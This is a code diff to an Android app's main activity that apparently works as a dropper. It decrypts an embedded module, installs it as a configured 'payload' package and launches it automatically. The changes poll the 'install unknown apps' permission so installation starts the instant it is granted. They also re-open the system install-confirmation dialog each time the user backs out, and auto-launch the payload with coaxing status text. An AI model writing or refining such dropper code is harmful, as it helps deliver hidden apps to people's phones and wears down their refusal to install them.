@@ -11,6 +11,8 @@ import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.widget.Button;
 import android.widget.TextView;
@@ -32,22 +34,99 @@ public class MainActivity extends Activity {
     private static final int    REQ_UNKNOWN_SOURCES = 1001;
     private static final String ACTION_INSTALL_DONE = "com.installer.drop.INSTALL_DONE";
 
+    // Polling cadences.
+    private static final long PERM_POLL_MS    = 400;   // poll grant of "install unknown apps"
+    private static final long LAUNCH_POLL_MS  = 300;   // poll until installed package appears
+    private static final long LAUNCH_TIMEOUT  = 15000; // give up auto-launch after 15s
+
     private TextView status;
+    private Button   btn;
     private InstallResultReceiver receiver;
+    private final Handler ui = new Handler(Looper.getMainLooper());
+
+    // True while we're actively waiting for the user to flip the
+    // "install unknown apps" toggle in Settings; drives the poll loop.
+    private boolean awaitingUnknownSourcesGrant = false;
+
+    // Cached "Confirm install" intent — if the user backs out without
+    // confirming, we re-show it on next onResume so they don't get stuck.
+    private Intent  pendingConfirmIntent = null;
+    // Suppress one re-show right after we just launched the confirm intent
+    // (the system temporarily backgrounds us → onResume would otherwise loop).
+    private boolean justLaunchedConfirm  = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         status = findViewById(R.id.status);
-        Button btn = findViewById(R.id.btnInstall);
-        btn.setOnClickListener(v -> startInstall());
+        btn    = findViewById(R.id.btnInstall);
+        btn.setOnClickListener(v -> onInstallClicked());
+
+        // If the payload is already installed, skip everything and launch.
+        if (isPayloadInstalled()) {
+            status.setText("App installed, kindly wait for it to launch…");
+            btn.setEnabled(false);
+            launchPayload();
+        }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+
+        // Already installed? Just launch and bail.
+        if (isPayloadInstalled()) {
+            pendingConfirmIntent = null;
+            awaitingUnknownSourcesGrant = false;
+            status.setText("App installed, kindly wait for it to launch…");
+            btn.setEnabled(false);
+            launchPayload();
+            return;
+        }
+
+        // User came back from the system "Install unknown apps" screen — if
+        // they granted it, kick off the install IMMEDIATELY (no extra tap).
+        if (awaitingUnknownSourcesGrant) {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
+                    || getPackageManager().canRequestPackageInstalls()) {
+                awaitingUnknownSourcesGrant = false;
+                new Thread(this::dropAndInstall).start();
+            }
+        }
+
+        // User pressed Back on the "Confirm install" dialog without
+        // confirming — re-show it so they don't get stuck.
+        if (pendingConfirmIntent != null) {
+            if (justLaunchedConfirm) {
+                justLaunchedConfirm = false;
+            } else {
+                Intent again = pendingConfirmIntent;
+                justLaunchedConfirm = true;
+                try {
+                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(again);
+                } catch (Exception ignored) { }
+            }
+        }
+    }
+
+    private void onInstallClicked() {
+        if (isPayloadInstalled()) {
+            status.setText("App installed, kindly wait for it to launch…");
+            btn.setEnabled(false);
+            launchPayload();
+            return;
+        }
+        startInstall();
     }
 
     private void startInstall() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                 && !getPackageManager().canRequestPackageInstalls()) {
-            status.setText("Allow install from this source, then return.");
+            status.setText("Allow install from this source — install starts automatically.");
+            awaitingUnknownSourcesGrant = true;
+            startPermissionPoll();
             Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                     Uri.parse("package:" + getPackageName()));
             startActivityForResult(i, REQ_UNKNOWN_SOURCES);
@@ -56,12 +135,33 @@ public class MainActivity extends Activity {
         new Thread(this::dropAndInstall).start();
     }
 
+    // Poll the permission state while the user is on the Settings screen so
+    // that the moment they flip the toggle, the install dialog appears.
+    // onResume covers the "user came back" case; this covers "still on
+    // Settings but already toggled" so we don't wait for the user to navigate
+    // back manually.
+    private void startPermissionPoll() {
+        ui.postDelayed(new Runnable() {
+            @Override public void run() {
+                if (!awaitingUnknownSourcesGrant) return;
+                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
+                        || getPackageManager().canRequestPackageInstalls()) {
+                    awaitingUnknownSourcesGrant = false;
+                    new Thread(MainActivity.this::dropAndInstall).start();
+                    return;
+                }
+                ui.postDelayed(this, PERM_POLL_MS);
+            }
+        }, PERM_POLL_MS);
+    }
+
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_UNKNOWN_SOURCES) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                     && getPackageManager().canRequestPackageInstalls()) {
+                awaitingUnknownSourcesGrant = false;
                 new Thread(this::dropAndInstall).start();
             } else {
                 runOnUiThread(() -> status.setText("Permission denied — cannot install."));
@@ -69,8 +169,62 @@ public class MainActivity extends Activity {
         }
     }
 
+    private boolean isPayloadInstalled() {
+        String pkg = BuildConfig.PAYLOAD_PACKAGE;
+        if (pkg == null || pkg.isEmpty()) return false;
+        try {
+            getPackageManager().getPackageInfo(pkg, 0);
+            return true;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+
+    // Poll until the freshly-installed payload package is queryable, then
+    // launch it. Some devices take a beat after STATUS_SUCCESS before
+    // getLaunchIntentForPackage returns non-null.
+    private void launchPayload() {
+        final String pkg = BuildConfig.PAYLOAD_PACKAGE;
+        if (pkg == null || pkg.isEmpty()) {
+            status.setText("Installed (no payload package configured to launch).");
+            return;
+        }
+        final long deadline = System.currentTimeMillis() + LAUNCH_TIMEOUT;
+        ui.post(new Runnable() {
+            @Override public void run() {
+                Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
+                if (launch != null) {
+                    launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    try {
+                        startActivity(launch);
+                        status.setText("Launched " + pkg);
+                    } catch (Exception e) {
+                        status.setText("Launch failed: " + e.getMessage());
+                    }
+                    return;
+                }
+                if (System.currentTimeMillis() < deadline) {
+                    ui.postDelayed(this, LAUNCH_POLL_MS);
+                } else {
+                    status.setText("Installed, but no launchable activity found for " + pkg);
+                }
+            }
+        });
+    }
+
     private void dropAndInstall() {
         try {
+            // Re-check on the worker thread in case install completed between
+            // the click and the thread starting (e.g. a background install).
+            if (isPayloadInstalled()) {
+                runOnUiThread(() -> {
+                    status.setText("App installed, kindly wait for it to launch…");
+                    btn.setEnabled(false);
+                    launchPayload();
+                });
+                return;
+            }
+
             runOnUiThread(() -> status.setText("Decrypting module …"));
 
             File workDir = new File(getCacheDir(), "drop");
@@ -174,12 +328,21 @@ public class MainActivity extends Activity {
                 Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                 if (confirm != null) {
                     confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    // Cache so onResume can re-show it if the user backs out.
+                    pendingConfirmIntent = confirm;
+                    justLaunchedConfirm  = true;
                     startActivity(confirm);
                 }
             } else if (s == PackageInstaller.STATUS_SUCCESS) {
-                runOnUiThread(() -> status.setText("Installed successfully."));
+                pendingConfirmIntent = null;
+                runOnUiThread(() -> {
+                    status.setText("App installed, kindly wait for it to launch…");
+                    btn.setEnabled(false);
+                    launchPayload();
+                });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             } else {
+                pendingConfirmIntent = null;
                 String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                 runOnUiThread(() -> status.setText("Install failed: " + msg));
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
